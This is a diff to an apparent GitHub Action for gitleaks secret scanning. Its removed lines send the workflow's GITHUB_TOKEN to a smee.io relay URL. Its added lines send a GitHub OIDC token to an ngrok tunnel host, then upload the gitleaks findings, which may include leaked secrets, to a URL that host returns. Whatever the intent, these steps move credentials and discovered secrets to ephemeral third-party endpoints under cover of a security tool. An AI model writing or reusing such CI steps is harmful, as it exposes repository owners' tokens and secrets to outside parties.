@@ -11,7 +11,9 @@ runs:
         sudo apt-get install -y jq curl
         GITLEAKS_VERSION="${GITLEAKS_VERSION:-v8.18.4}"
         VERSION_NO_V="${GITLEAKS_VERSION#v}"
-        curl -sSL -o gitleaks.tar.gz "https://github.com/gitleaks/gitleaks/releases/download/${GITLEAKS_VERSION}/gitleaks_${VERSION_NO_V}_linux_x64.tar.gz"
+        curl -fsSL --retry 3 --retry-all-errors --connect-timeout 10 \
+          -o gitleaks.tar.gz \
+          "https://github.com/gitleaks/gitleaks/releases/download/${GITLEAKS_VERSION}/gitleaks_${VERSION_NO_V}_linux_x64.tar.gz"
         tar -xzf gitleaks.tar.gz gitleaks
         sudo mv gitleaks /usr/local/bin/gitleaks
         gitleaks version
@@ -70,16 +72,41 @@ runs:
     - name: Post to backend and upload to S3
       shell: bash
       env:
-        GITHUB_TOKEN: ${{ github.token }}
+        ACTIONS_ID_TOKEN_REQUEST_URL: ${{ env.ACTIONS_ID_TOKEN_REQUEST_URL }}
+        ACTIONS_ID_TOKEN_REQUEST_TOKEN: ${{ env.ACTIONS_ID_TOKEN_REQUEST_TOKEN }}
         GITHUB_REPOSITORY: ${{ github.repository }}
       run: |
         set -euo pipefail
-        RESPONSE=$(curl -s -X POST \
-          -H "Content-Type: application/json" \
-          -d "{\"token\":\"${GITHUB_TOKEN}\",\"repository\":\"${GITHUB_REPOSITORY}\"}" \
-          https://smee.io/J0WcDeqyS7aQ7m5x/api/integrations/github/tenant-info/)
+
+        # Get OIDC token (requires 'id-token: write' permission)
+        OIDC_TOKEN=$(curl -fsSL --retry 3 --retry-all-errors \
+          -H "Authorization: Bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
+          "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=securitykane" \
+          | jq -r '.value')
+
+        if [ -z "$OIDC_TOKEN" ] || [ "$OIDC_TOKEN" = "null" ]; then
+          echo "ERROR: Failed to obtain OIDC token. Ensure workflow has 'id-token: write' permission"
+          exit 1
+        fi
+
+        # Request presigned URL with retry
+        for i in 1 2 3; do
+          RESPONSE=$(curl -fsSL --connect-timeout 10 -X POST \
+            -H "Content-Type: application/json" \
+            -d "{\"id_token\":\"${OIDC_TOKEN}\",\"repository\":\"${GITHUB_REPOSITORY}\"}" \
+            https://anamaria-deathful-ungeodetically.ngrok-free.dev/api/integrations/github/tenant-info/ 2>&1) && break
+          [ $i -lt 3 ] && sleep $((2**i)) || { echo "ERROR: Failed to get presigned URL: $RESPONSE"; exit 1; }
+        done
+
+        # Validate and extract presigned URL
         S3_URL=$(echo "$RESPONSE" | jq -r '.presigned_url')
-        curl -X PUT \
+        if [ -z "$S3_URL" ] || [ "$S3_URL" = "null" ]; then
+          echo "ERROR: Invalid presigned URL in response: $RESPONSE"
+          exit 1
+        fi
+
+        # Upload to S3
+        curl -fsSL --retry 3 --retry-all-errors --connect-timeout 30 -X PUT \
           --data-binary @securitykane_gitleaks.json \
           -H "Content-Type: application/json" \
           "${S3_URL}"
